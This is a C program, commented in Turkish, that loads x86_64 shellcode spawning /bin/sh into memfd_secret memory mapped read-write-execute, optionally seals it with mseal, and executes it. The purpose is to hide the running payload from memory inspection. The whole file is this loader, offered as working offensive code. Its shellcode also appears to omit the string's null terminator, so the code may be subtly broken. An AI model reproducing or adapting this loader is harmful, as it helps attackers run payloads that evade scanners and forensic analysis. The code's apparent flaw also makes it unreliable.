#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <errno.h>

#ifndef __NR_memfd_secret
#define __NR_memfd_secret 447
#endif
#ifndef __NR_mseal
#define __NR_mseal 462
#endif

// x86_64 shellcode: execve("/bin/sh", NULL, NULL)
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,       // xor rax, rax
    0x48, 0x31, 0xd2,       // xor rdx, rdx
    0x48, 0x31, 0xf6,       // xor rsi, rsi
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, // mov rbx, /bin//sh
    0x53,                   // push rbx
    0x48, 0x89, 0xe7,       // mov rdi, rsp
    0xb0, 0x3b,             // mov al, 59
    0x0f, 0x05              // syscall
};

int main() {
    int fd;
    void *addr;

    // 1. memfd_secret ile gizli dosya oluştur
    fd = syscall(__NR_memfd_secret, 0);
    if (fd == -1) {
        perror("memfd_secret");
        return 1;
    }

    // 2. Belleği eşle (okuma-yazma-çalıştırma)
    addr = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    // 3. Shellcode'u kopyala
    memcpy(addr, shellcode, sizeof(shellcode));

    // 4. (Opsiyonel) mühürle – kernel 6.10+ gerektirir, başarısız olursa devam et
    if (syscall(__NR_mseal, addr, sizeof(shellcode), 0) == -1) {
        perror("mseal (uyarı, devam ediliyor)");
    } else {
        printf("[+] Shellcode mühürlendi.\n");
    }

    printf("[+] Shellcode gizli bellekte, çalıştırılıyor...\n");
    // 5. Shellcode'u çalıştır
    ((void (*)())addr)();

    // Bu noktaya gelinmez (shellcode yeni kabuk açar)
    return 0;
}
